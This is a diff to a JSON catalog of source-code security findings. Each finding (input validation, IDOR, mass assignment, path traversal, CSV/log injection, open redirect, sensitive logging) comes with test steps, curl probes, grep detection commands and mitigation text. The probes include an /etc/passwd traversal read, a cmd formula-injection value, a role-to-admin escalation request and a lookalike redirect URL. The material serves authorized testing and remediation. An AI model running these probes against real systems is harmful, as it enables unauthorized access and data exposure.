     "Include a test case in the CI pipeline that triggers a representative unhandled exception against a production-configured build and asserts the response contains no verbose detail."
    ],
+   "mitigationClientFacing": "A review of your code found error handling that either reveals sensitive internal detail when something goes wrong, or — more seriously — defaults to allowing an action when it should refuse. Both give an attacker an advantage: information in the first case, access in the second. The fix is to handle errors so they reveal nothing sensitive to the user and always fail safely, denying access or stopping the operation when something unexpected occurs rather than proceeding. The fail-open case is the priority, since it converts an ordinary error into an access bypass. Confirm the corrected behaviour by triggering the error paths on the running application.",
    "reference": {
     "standard": "A05:2021 - Security Misconfiguration",
     "cwe": "CWE-755",
@@ -1707,12 +2371,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A10",
+   "categoryName": "Mishandling of Exceptional Conditions",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ERRH",
+     "name": "Error Handling"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V16",
+     "name": "Security Logging and Error Handling"
+    }
+   ]
   },
   {
    "id": "SRC-025",
    "domain": "SRC",
-   "phase": 479,
    "title": "Improper Input Validation",
    "sequence": 479,
    "severity": "high",
@@ -1726,7 +2411,9 @@
     "For each significant input field/endpoint, trace whether validation logic (type, length, format, range checks) exists before the input is used in any downstream processing.",
     "Where validation exists, assess its completeness — does it correctly reject all malformed/boundary values, or only the most obviously incorrect ones.",
     "Build and run the application, then submit a range of malformed/boundary test values (oversized strings, unexpected types, null bytes, boundary numeric values) to the identified fields and observe the resulting behavior.",
-    "Trace where the unvalidated input flows to determine the specific resulting vulnerability class (a database query, a file path, a template) for more targeted follow-up testing."
+    "Trace where the unvalidated input flows to determine the specific resulting vulnerability class (a database query, a file path, a template) for more targeted follow-up testing.",
+    "Enumerate the entry points that accept external input and confirm each validates type, range and format at the server rather than assuming a trusted caller.",
+    "Build the application and submit boundary and malformed values to the identified entry points to confirm the missing validation is reachable at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes malformed-input testing against a running build of the reviewed application.",
@@ -1742,12 +2429,21 @@
     },
     {
      "label": "Submit a range of boundary/malformed test values",
-     "command": "for val in '' 'null' '-1' '99999999999999999999' '<script>' '../../etc/passwd'; do curl -s -X POST https://app.target.com/api/orders -d '{\"quantity\":\"'$val'\"}'; done"
+     "command": "for val in '' 'null' '-1' '99999999999999999999' '<script>' '../../etc/passwd'; do curl -s -X POST https://<app>/api/orders -d '{\"quantity\":\"'$val'\"}'; done"
+    },
+    {
+     "label": "Search source for request handlers that consume input without a validation step",
+     "command": "grep -rnE 'req\\.(body|query|params)|request\\.(form|args|json)|@RequestParam' src/ -A3 | grep -viE 'validate|schema|sanitiz'"
+    },
+    {
+     "label": "Confirm a validated-looking handler rejects a malformed value at run time",
+     "command": "# submit a malformed value to the identified handler and confirm it is rejected rather than processed"
     }
    ],
    "variants": [
     "Missing validation on a numeric/boundary field enabling a downstream logic error, versus missing validation on a string field enabling a downstream injection vulnerability — the same root cause manifests differently depending on the field's downstream use.",
-    "Validation present but inconsistently applied across similar endpoints (one properly validates, a near-identical one added later doesn't)."
+    "Validation present but inconsistently applied across similar endpoints (one properly validates, a near-identical one added later doesn't).",
+    "Validation present on the primary field but absent on an optional or nested field that reaches the same sensitive sink."
    ],
    "mitigation": [
     "Apply strict, allowlist-based input validation (expected type, length, character set, range) at every input surface, consistently across every endpoint handling similar data.",
@@ -1755,6 +2451,7 @@
     "Use a schema-validation library/framework applied consistently across the API rather than ad hoc, per-endpoint validation logic, reducing the chance of a missed or inconsistent check.",
     "Include boundary and malformed-input test cases in the standard regression-test suite for every significant input field."
    ],
+   "mitigationClientFacing": "Your code accepts external input without adequately checking it is the right type, within the expected range, and in the expected format, which allows malformed or unexpected input to cause incorrect behaviour or reach a more serious flaw downstream. The fix is to validate all input at the point it enters the server, rejecting anything that does not match what is expected before it is used. Cover optional and nested fields as well as the obvious ones, since those are where validation is most often missing. This is foundational, and the corrected validation should be confirmed against boundary and malformed values on the running application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-20",
@@ -1773,12 +2470,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-026",
    "domain": "SRC",
-   "phase": 480,
    "title": "Insecure Direct Object Reference (Source-Identified)",
    "sequence": 480,
    "severity": "high",
@@ -1792,7 +2510,9 @@
     "For each endpoint accepting an object identifier, trace the data-access call (a database query, an ORM call) and confirm whether it includes an ownership-scoping condition tying the query to the authenticated caller's own identity.",
     "Flag any handler where the query/update is scoped only by the supplied object ID, with no ownership condition anywhere in the call chain.",
     "Build and run the application, then confirm the finding at runtime using two separate test accounts as described in the exploitation steps.",
-    "Check whether object identifiers are sequential/predictable, compounding the finding's practical severity if so."
+    "Check whether object identifiers are sequential/predictable, compounding the finding's practical severity if so.",
+    "Trace the object lookup to confirm it uses a client-supplied identifier without an ownership check, and build the application to confirm another user's object is returned.",
+    "Confirm whether the identifier is predictable, since a sequential identifier turns a single missing check into bulk exposure."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes cross-account object-access testing using the provided test accounts against the identified endpoint.",
@@ -1808,12 +2528,21 @@
     },
     {
      "label": "Confirm the missing check at runtime with two test accounts",
-     "command": "curl -s https://app.target.com/orders/1001 -H \"Authorization: Bearer <account-B-token>\"  # account A's order ID, requested as account B"
+     "command": "curl -s https://<app>/orders/1001 -H \"Authorization: Bearer <account-B-token>\"  # account A's order ID, requested as account B"
+    },
+    {
+     "label": "Search source for object lookups by request identifier without an ownership predicate",
+     "command": "grep -rnE 'findById|get.*\\(.*req\\.(params|query)|WHERE id\\s*=' src/ -A3 | grep -viE 'owner|user_id|tenant|belongs'"
+    },
+    {
+     "label": "Confirm an object identifier is predictable by sampling freshly-created records",
+     "command": "# create several records and confirm whether their identifiers increment predictably"
     }
    ],
    "variants": [
     "Missing ownership check on a read operation versus a write/delete operation, the latter being materially more severe.",
-    "Missing check identified in a REST handler versus a GraphQL resolver, the latter being easier to overlook given the spread of authorization logic across many individual resolvers."
+    "Missing check identified in a REST handler versus a GraphQL resolver, the latter being easier to overlook given the spread of authorization logic across many individual resolvers.",
+    "A reference exposed in an update or delete path rather than a read, so restricting the read endpoint leaves the object modifiable by another user."
    ],
    "mitigation": [
     "Add an explicit ownership-scoping condition to every data-access query/update involving a caller-supplied object identifier, scoping it to the authenticated caller's own records.",
@@ -1821,6 +2550,7 @@
     "Use non-sequential, non-guessable object identifiers (UUIDs) as defense in depth.",
     "Include a static-analysis rule or code-review checklist item specifically flagging any new data-access call using a caller-supplied ID without an accompanying ownership condition."
    ],
+   "mitigationClientFacing": "A review of your code found that objects are retrieved using an identifier from the user's request without checking that the user is entitled to that specific object, so an attacker can reach other users' data by changing the identifier. Where the identifiers are sequential, this allows data to be harvested at scale. The fix is to confirm ownership on every access to an object, so that even a valid identifier returns nothing unless the requester is entitled to it; using non-sequential identifiers adds a second layer. Apply the check to updates and deletes as well as reads, and confirm on the running application.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-639",
@@ -1840,12 +2570,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1213",
+     "name": "Data from Information Repositories",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   },
   {
    "id": "SRC-027",
    "domain": "SRC",
-   "phase": 481,
    "title": "Mass Assignment / Auto-Binding (Source-Identified)",
    "sequence": 481,
    "severity": "high",
@@ -1859,7 +2610,8 @@
     "For each create/update endpoint, locate the request-binding call and confirm whether it passes the complete request body directly to the model, or an explicitly-constructed, allowlisted subset.",
     "Where the complete body is bound directly, obtain the full underlying model schema to identify additional fields beyond the endpoint's documented/intended request structure.",
     "Build and run the application, then craft a request including an additional field (a role, a price) alongside the legitimate expected fields and submit it using a test account.",
-    "Confirm whether the additional field was silently accepted and applied by retrieving the resulting object afterward."
+    "Confirm whether the additional field was silently accepted and applied by retrieving the resulting object afterward.",
+    "Trace the binding of request data to a model and build the application to confirm an unexposed field can be set through the request at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes mass-assignment testing using the provided test account against the identified endpoint.",
@@ -1875,16 +2627,21 @@
     },
     {
      "label": "Attempt mass assignment by including an additional, restricted field",
-     "command": "curl -s -X PATCH https://app.target.com/users/me -H \"Authorization: Bearer <test-token>\" -d '{\"displayName\":\"Test\",\"role\":\"admin\"}'"
+     "command": "curl -s -X PATCH https://<app>/users/me -H \"Authorization: Bearer <test-token>\" -d '{\"displayName\":\"Test\",\"role\":\"admin\"}'"
     },
     {
      "label": "Confirm whether the injected field was applied",
-     "command": "curl -s https://app.target.com/users/me -H \"Authorization: Bearer <test-token>\" | jq .role"
+     "command": "curl -s https://<app>/users/me -H \"Authorization: Bearer <test-token>\" | jq .role"
+    },
+    {
+     "label": "Search source for whole-object binding of request data to a model",
+     "command": "grep -rnE 'Object\\.assign\\(.*req|\\*\\*request|model\\(\\*\\*|new .*\\(req\\.body\\)|BindingResult' src/"
     }
    ],
    "variants": [
     "Mass assignment enabling direct privilege escalation (a role field) versus business-logic manipulation (a price/balance field).",
-    "Vulnerable auto-binding on a create/registration endpoint (allowing a brand-new account to be created with elevated privileges) versus on an update endpoint modifying an existing account."
+    "Vulnerable auto-binding on a create/registration endpoint (allowing a brand-new account to be created with elevated privileges) versus on an update endpoint modifying an existing account.",
+    "Mass assignment reaching a nested model's fields, which a guard listing only the top-level protected fields does not cover."
    ],
    "mitigation": [
     "Explicitly allowlist the specific fields permitted for each create/update endpoint, binding only those fields from the request body rather than passing the complete body to the framework's automatic-binding feature.",
@@ -1892,6 +2649,7 @@
     "Apply the same allowlisting discipline consistently to every create/update endpoint for every object type.",
     "Add a static-analysis rule flagging any use of a framework's unfiltered, complete-request-body auto-binding feature as a mandatory code-review item."
    ],
+   "mitigationClientFacing": "Your code takes the data a client submits and applies it wholesale to internal objects, which lets an attacker set fields they should not control — making themselves an administrator, or altering server-managed values — simply by including those fields in a request. The fix is to accept only the specific fields each operation is meant to allow and ignore the rest, rather than binding everything the client sends. Check nested objects too, since a guard listing only top-level fields misses fields set within a sub-object. This is a common route to privilege escalation through an ordinary update, and it should be confirmed on the running application.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-915",
@@ -1910,12 +2668,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A08",
+   "categoryName": "Software or Data Integrity Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   },
   {
    "id": "SRC-028",
    "domain": "SRC",
-   "phase": 482,
    "title": "Missing Integrity Verification (Updates/Artifacts)",
    "sequence": 482,
    "severity": "high",
@@ -1929,7 +2708,8 @@
     "Locate every code path that downloads an external artifact and subsequently executes or loads it (a plugin system, an auto-updater, a dynamically-fetched script/config).",
     "Confirm whether any cryptographic signature-verification step exists between the download and the artifact's use, distinct from simply checking that the download completed successfully over TLS.",
     "Build and run the application (or the specific updater component), then substitute an alternate artifact in place of the legitimate download (via a test proxy or a redirected download URL) and observe whether the application proceeds to execute/load it.",
-    "Where a checksum (rather than a cryptographic signature) is the only check present, confirm it provides no real protection by recomputing a matching checksum for the substituted artifact."
+    "Where a checksum (rather than a cryptographic signature) is the only check present, confirm it provides no real protection by recomputing a matching checksum for the substituted artifact.",
+    "Trace the update or artifact-loading path and build the application to confirm an unsigned or unverified artifact is accepted at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes download-substitution testing against a running build of the reviewed application's update/artifact-loading mechanism.",
@@ -1950,11 +2730,16 @@
     {
      "label": "Confirm execution of the substituted artifact",
      "command": "# observe whether the application executes/loads the substituted payload without any signature-mismatch rejection"
+    },
+    {
+     "label": "Search source for update or artifact loading without a signature or hash check",
+     "command": "grep -rnE 'download|fetch.*update|loadPlugin|require\\(.*download|install.*package' src/ | grep -viE 'verify|signature|checksum|hash'"
     }
    ],
    "variants": [
     "No integrity check at all versus a checksum-only check that provides the illusion of protection without any real cryptographic guarantee (an attacker substituting the artifact can also recompute a matching checksum).",
-    "Missing verification in an auto-update mechanism versus in a plugin/extension-loading system — both share the same root cause but differ in the specific artifact type and trust context."
+    "Missing verification in an auto-update mechanism versus in a plugin/extension-loading system — both share the same root cause but differ in the specific artifact type and trust context.",
+    "Integrity verified for the primary artifact but not for a bundled dependency or resource it pulls in, which reintroduces the unverified path one level down."
    ],
    "mitigation": [
     "Cryptographically sign every downloadable artifact with a private key held exclusively by the legitimate publisher, and verify that signature against an embedded, non-user-writable public key before executing/loading the artifact.",
@@ -1962,6 +2747,7 @@
     "Ensure the embedded trust anchor (public key/certificate) cannot be overwritten by a lower-privileged process or user, since a locally-tamperable trust anchor undermines even a correctly-implemented signature check.",
     "Treat any download-and-execute code path as a high-priority target during security-focused code review, given its inherent broad reach and typically elevated execution trust."
    ],
+   "mitigationClientFacing": "A review of your code found that updates or downloaded components are accepted without verifying they are genuine and unaltered, so an attacker who can interfere with them could deliver malicious code that your application runs. The fix is to cryptographically verify the integrity and origin of every update and downloaded artifact before using it, rejecting anything that does not validate. Extend the check to bundled dependencies the artifact pulls in, since verifying only the primary artifact leaves the same gap one level down. This is a supply-chain route into your running system, so it warrants prompt attention and confirmation on the built application.",
    "reference": {
     "standard": "A08:2021 - Software and Data Integrity Failures",
     "cwe": "CWE-494",
@@ -1981,12 +2767,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195",
+     "name": "Supply Chain Compromise",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
   },
   {
    "id": "SRC-029",
    "domain": "SRC",
-   "phase": 483,
    "title": "Missing Output Encoding",
    "sequence": 483,
    "severity": "high",
@@ -2000,7 +2807,8 @@
     "Identify every distinct output-generation context in the application beyond the primary HTML-rendering path: CSV/spreadsheet exports, log-writing calls, and any place where earlier output becomes later input to another process.",
     "For each context, confirm whether context-appropriate encoding/escaping is applied to any user-controllable data included in that output.",
     "Build and run the application, then populate a test field with a context-specific injection-indicator value (a formula-triggering prefix for CSV, a newline sequence for logs) and generate the corresponding output.",
-    "Inspect the resulting output for evidence that the special-meaning character was passed through unescaped rather than neutralized."
+    "Inspect the resulting output for evidence that the special-meaning character was passed through unescaped rather than neutralized.",
+    "Build the application and render request-derived data through the identified path to confirm it is emitted without context-appropriate encoding at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes output-generation testing against a running build of the reviewed application for the specific context identified.",
@@ -2016,16 +2824,21 @@
     },
     {
      "label": "Test CSV formula-injection via a crafted field value",
-     "command": "curl -s -X POST https://app.target.com/profile -H \"Authorization: Bearer <test-token>\" -d '{\"displayName\":\"=cmd|\\x27 /C calc\\x27!A0\"}'\n# then trigger the CSV export feature and inspect the resulting file"
+     "command": "curl -s -X POST https://<app>/profile -H \"Authorization: Bearer <test-token>\" -d '{\"displayName\":\"=cmd|\\x27 /C calc\\x27!A0\"}'\n# then trigger the CSV export feature and inspect the resulting file"
     },
     {
      "label": "Test log-injection via a crafted newline sequence",
-     "command": "curl -s https://app.target.com/api/search -H 'User-Agent: legit-agent%0d%0aFAKE-LOG-ENTRY: admin-login-success'"
+     "command": "curl -s https://<app>/api/search -H 'User-Agent: legit-agent%0d%0aFAKE-LOG-ENTRY: admin-login-success'"
+    },
+    {
+     "label": "Search source for output paths that emit data without encoding",
+     "command": "grep -rnE 'res\\.write|response\\.write|out\\.print|\\.send\\(.*\\+|template.*\\+.*req' src/"
     }
    ],
    "variants": [
     "CSV/formula-injection specifically (a distinct, well-known variant of missing output encoding for spreadsheet-consumed exports) versus log-injection (missing encoding for log-format-specific special characters).",
-    "Missing output encoding feeding directly into a downstream command/query interpreter, effectively chaining into a command-injection or SQL-injection finding rather than being a standalone output-encoding issue."
+    "Missing output encoding feeding directly into a downstream command/query interpreter, effectively chaining into a command-injection or SQL-injection finding rather than being a standalone output-encoding issue.",
+    "Encoding applied for one output context — HTML — but not another the same value reaches, such as a URL attribute or a script context, where different encoding is required."
    ],
    "mitigation": [
     "Apply context-specific output encoding/escaping for every distinct output format the application generates, not just the primary HTML-rendering path — prefix any CSV field beginning with a formula-triggering character with a single quote or otherwise neutralize it, and escape/reject control characters in log output.",
@@ -2033,6 +2846,7 @@
     "Treat every output-generation context as requiring its own explicit escaping review during a security-focused code audit, rather than assuming XSS-specific HTML-escaping coverage implies coverage everywhere.",
     "Include context-specific injection test cases (CSV-formula, log-injection) in the standard regression-test suite for any feature generating that output type."
    ],
+   "mitigationClientFacing": "Your code sends user-supplied data into web pages or other outputs without the encoding needed to keep it from being interpreted as code, which can lead to script injection or other output-context attacks. This is closely related to the cross-site scripting finding and shares its remedy: encode all user data appropriately for the specific context it is placed into — a page body, a URL, an attribute, a script all require different handling. The fix is to apply the correct encoding at every output point, and to confirm on the running application that data reaches each context safely rather than raw.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-116",
@@ -2052,12 +2866,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V1",
+     "name": "Encoding and Sanitization"
+    }
+   ]
   },
   {
    "id": "SRC-030",
    "domain": "SRC",
-   "phase": 484,
    "title": "Open Redirect (Source-Identified)",
    "sequence": 484,
    "severity": "medium",
@@ -2071,7 +2906,8 @@
     "Locate every code path implementing a redirect based on a caller-supplied URL parameter.",
     "Confirm whether any validation exists restricting the destination to an internal, expected path/domain, versus accepting any URL value supplied.",
     "Build and run the application, then submit the identified redirect parameter with an external test URL and observe whether the application redirects to it.",
-    "Assess whether validation, if present, is genuinely robust (an exact-match internal-path allowlist) versus bypassable (a substring/prefix check defeated by a crafted URL like `https://trusted.com.evil-test.com`)."
+    "Assess whether validation, if present, is genuinely robust (an exact-match internal-path allowlist) versus bypassable (a substring/prefix check defeated by a crafted URL like `https://trusted.com.evil-test.com`).",
+    "Build the application and supply an external destination to the identified redirect to confirm the server redirects off-site without validating the target."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes open-redirect testing against a running build of the reviewed application.",
@@ -2087,16 +2923,21 @@
     },
     {
      "label": "Test the redirect with an external test destination",
-     "command": "curl -sI \"https://app.target.com/login?returnUrl=https://evil-test.example.com\" | grep -i location"
+     "command": "curl -sI \"https://<app>/login?returnUrl=https://<app>\" | grep -i location"
     },
     {
      "label": "Test a suspected bypassable substring/prefix validation check",
-     "command": "curl -sI \"https://app.target.com/login?returnUrl=https://app.target.com.evil-test.example.com\" | grep -i location"
+     "command": "curl -sI \"https://<app>/login?returnUrl=https://<app>.evil-test.example.test\" | grep -i location"
+    },
+    {
+     "label": "Search source for redirect targets built from request input without validation",
+     "command": "grep -rnE 'redirect\\(|sendRedirect|Location:|res\\.location' src/ -A1 | grep -iE 'req|request|param|url|next|return'"
     }
    ],
    "variants": [
     "No validation at all versus a substring/prefix-based check that's bypassable via a crafted lookalike domain.",
-    "Open redirect on a post-login flow specifically (higher phishing value, since it follows an apparently-legitimate authentication step) versus a more general, less trust-laden redirect feature."
+    "Open redirect on a post-login flow specifically (higher phishing value, since it follows an apparently-legitimate authentication step) versus a more general, less trust-laden redirect feature.",
+    "A redirect that validates the target against an allowlist but with a flawed check — a substring or prefix match — that an attacker-controlled URL can satisfy."
    ],
    "mitigation": [
     "Restrict redirect destinations to an explicit allowlist of internal, expected paths, using an exact match rather than a substring/prefix check.",
@@ -2104,6 +2945,7 @@
     "Never accept a full external URL as a redirect destination parameter if the feature's actual, legitimate use case only requires redirecting to internal application paths.",
     "Include an automated test asserting the redirect feature rejects an external test destination in the standard regression-test suite."
    ],
+   "mitigationClientFacing": "A review of your code found that the application will redirect users to a web address supplied in the request without checking it, so an attacker can craft a link that appears to go to your site but sends the user to a malicious one — useful for convincing phishing. The fix is to validate redirect destinations against a list of allowed locations, or to avoid taking the destination from the request at all, and to ensure the allowlist check cannot be satisfied by a lookalike address. This is commonly used to lend credibility to phishing, and the corrected behaviour should be confirmed on the running application.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-601",
@@ -2122,12 +2964,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CLNT",
+     "name": "Client-side"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V10",
+     "name": "OAuth and OIDC"
+    }
+   ]
   },
   {
    "id": "SRC-031",
    "domain": "SRC",
-   "phase": 485,
    "title": "Path Traversal (Source-Identified)",
    "sequence": 485,
    "severity": "high",
@@ -2141,7 +3004,8 @@
     "Locate every file-access function that incorporates a caller-supplied filename/path component, and confirm whether the resulting path is normalized and verified to remain within the intended base directory before the file operation executes.",
     "Build and run the application, then submit a traversal-sequence-crafted value (`../../../../etc/passwd` or an OS-appropriate equivalent) to the identified parameter.",
     "Confirm whether the response reflects content from outside the intended base directory, proving the traversal succeeded.",
-    "For a write-capable file-access function, similarly test whether a traversal sequence can direct a write operation outside the intended directory."
+    "For a write-capable file-access function, similarly test whether a traversal sequence can direct a write operation outside the intended directory.",
+    "Build the application and submit a traversal sequence to the identified path parameter to confirm a file outside the intended directory is reached at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes path-traversal testing against a running build of the reviewed application.",
@@ -2157,16 +3021,21 @@
     },
     {
      "label": "Test path traversal against the identified file-read parameter",
-     "command": "curl -s \"https://app.target.com/download?file=../../../../etc/passwd\""
+     "command": "curl -s \"https://<app>/download?file=../../../../etc/passwd\""
     },
     {
      "label": "Test path traversal against a write-capable file-access parameter",
-     "command": "curl -s -X POST https://app.target.com/upload -d '{\"filename\":\"../../../../tmp/poc_traversal_test.txt\",\"content\":\"test\"}'"
+     "command": "curl -s -X POST https://<app>/upload -d '{\"filename\":\"../../../../tmp/poc_traversal_test.txt\",\"content\":\"test\"}'"
+    },
+    {
+     "label": "Search source for filesystem access built from request input without canonicalisation",
+     "command": "grep -rnE 'open\\(|readFile|File\\(|Path\\(|fopen|include' src/ -A2 | grep -iE 'req|request|param|input'"
     }
    ],
    "variants": [
     "Traversal via a straightforward relative-path sequence versus via an encoded/obfuscated variant (URL-encoded, double-encoded, or null-byte-terminated) designed to bypass a partial/naive filtering attempt.",
-    "Path-traversal-vulnerable read operation (information disclosure) versus write operation (potential further compromise via overwriting a critical file) — the latter is materially more severe."
+    "Path-traversal-vulnerable read operation (information disclosure) versus write operation (potential further compromise via overwriting a critical file) — the latter is materially more severe.",
+    "Traversal into a different logical area rather than up the directory tree — an absolute path accepted where a relative one was expected — which a check for the parent-directory sequence alone misses."
    ],
    "mitigation": [
     "Normalize the resulting file path (resolving all `../` and symbolic-link components) and explicitly verify it remains within the intended base directory before performing the file operation, rejecting any request where it doesn't.",
@@ -2174,6 +3043,7 @@
     "Apply the operating system's own file-system permissions to further restrict what the application process can access, as defense in depth beyond application-level path validation.",
     "Include path-traversal test cases (including encoded/obfuscated variants) in the standard regression-test suite for every file-access endpoint."
    ],
+   "mitigationClientFacing": "Your code builds file paths from user input without properly confining them, which lets an attacker use navigation sequences to reach files outside the intended directory — reading configuration, credentials, or other sensitive files on the server. The fix is to resolve and confine every file path to the intended directory, rejecting anything that escapes it, rather than trusting the path the user supplied. Guard against absolute paths as well as parent-directory sequences, since a check for one alone misses the other. This can expose sensitive server files, so it warrants prompt attention and confirmation on the running application.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-22",
@@ -2192,12 +3062,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1083",
+     "name": "File and Directory Discovery",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V5",
+     "name": "File Handling"
+    }
+   ]
   },
   {
    "id": "SRC-032",
    "domain": "SRC",
-   "phase": 486,
    "title": "Sensitive Data Logging",
    "sequence": 486,
    "severity": "medium",
@@ -2211,7 +3102,9 @@
     "Search the codebase for logging calls that log a complete request/response object, an error object containing embedded request data, or an explicitly-named sensitive variable.",
     "For each candidate, confirm whether the logged content includes genuinely sensitive fields (password, token, card number, PII) rather than a filtered/redacted subset.",
     "Build and run the application, populate representative sensitive test data through normal use, and inspect the actual log output for the presence of that data in plaintext.",
-    "Check whether a third-party log-aggregation service is used, which would extend the population with access beyond the organization's own personnel."
+    "Check whether a third-party log-aggregation service is used, which would extend the population with access beyond the organization's own personnel.",
+    "Build the application, exercise the logging path, and inspect the log output to confirm sensitive values are written in the clear at run time.",
+    "Confirm whether the same values are also written by a bundled logging or monitoring component, not only the application's own code."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes log-content inspection during normal use of a running build of the reviewed application, populated with representative sensitive test data.",
@@ -2227,12 +3120,21 @@
     },
     {
      "label": "Trigger the identified logging statement with representative sensitive test data",
-     "command": "curl -s -X POST https://app.target.com/login -d '{\"username\":\"test\",\"password\":\"TestPassword123!\"}'\n# then inspect the application's log output for this request"
+     "command": "curl -s -X POST https://<app>/login -d '{\"username\":\"test\",\"password\":\"TestPassword123!\"}'\n# then inspect the application's log output for this request"
+    },
+    {
+     "label": "Search source for sensitive values passed into logging calls",
+     "command": "grep -rnE 'log|logger|console\\.(log|error)|print' src/ | grep -iE 'password|token|secret|ssn|card|authorization'"
+    },
+    {
+     "label": "Confirm sensitive values appear in log output at run time",
+     "command": "# exercise the logging path with test credentials and inspect the emitted logs for them in the clear"
     }
    ],
    "variants": [
     "Sensitive data logged unconditionally in production versus only in a debug-level log statement that's supposed to be disabled in production but isn't correctly gated.",
-    "Sensitive data logged from first-party application code versus from a third-party library/middleware's own default, verbose logging behavior."
+    "Sensitive data logged from first-party application code versus from a third-party library/middleware's own default, verbose logging behavior.",
+    "Sensitive data absent from the application's own logs but captured by a request-logging middleware that records full request bodies including credentials."
    ],
    "mitigation": [
     "Remove logging of complete request/response objects containing sensitive fields; log only the specific, non-sensitive fields genuinely needed for debugging/audit purposes.",
@@ -2240,6 +3142,7 @@
     "Add a static-analysis rule flagging any logging call referencing a variable/object likely to contain sensitive data as a mandatory code-review item.",
     "Apply an appropriate, minimized log-retention period and access-control restriction to the log-aggregation system itself, as defense in depth."
    ],
+   "mitigationClientFacing": "A review of your code found sensitive values — passwords, tokens, personal data — written to logs, which stores them in a place that is often less protected than the main data store and is read during development and support. The fix is to remove sensitive values from everything the application logs, and to check any logging middleware that records full request contents, since that captures credentials the application's own logging would not. This is easy to introduce by accident because logging feels harmless, but it quietly relocates protected data into an unprotected place. Confirm on the running application that the logs are clean.",
    "reference": {
     "standard": "A09:2021 - Security Logging and Monitoring Failures",
     "cwe": "CWE-532",
@@ -2258,12 +3161,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
